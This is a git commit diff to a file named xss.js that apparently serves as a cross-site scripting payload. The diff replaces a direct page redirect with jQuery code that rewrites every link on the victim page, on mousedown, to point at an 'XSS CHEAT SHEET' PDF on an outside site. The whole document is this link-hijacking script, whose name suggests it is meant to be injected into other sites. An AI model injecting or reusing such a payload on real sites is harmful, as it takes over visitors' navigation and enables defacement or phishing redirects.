76483ca03f81e8f0217dad9bbac1afb071f43ee3
st0rno <56682392+st0rno@users.noreply.github.com>
2021-12-01 20:52:44 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,2 +1,9 @@
-console.log('xss-v4');
-window.location.href = 'https://edu.anarcho-copy.org/Against%20Security%20&%20%20Self%20Security/XSS%20CHEAT%20SHEET%202020%20edition.pdf';
+console.log('xss-v5');
+    $(document).ready(function () {
+
+        var url = 'https://edu.anarcho-copy.org/Against%20Security%20&%20%20Self%20Security/XSS%20CHEAT%20SHEET%202020%20edition.pdf';
+        $("a").on('mousedown', function () {
+            $(this).attr("href", url);
+        });
+
+    });
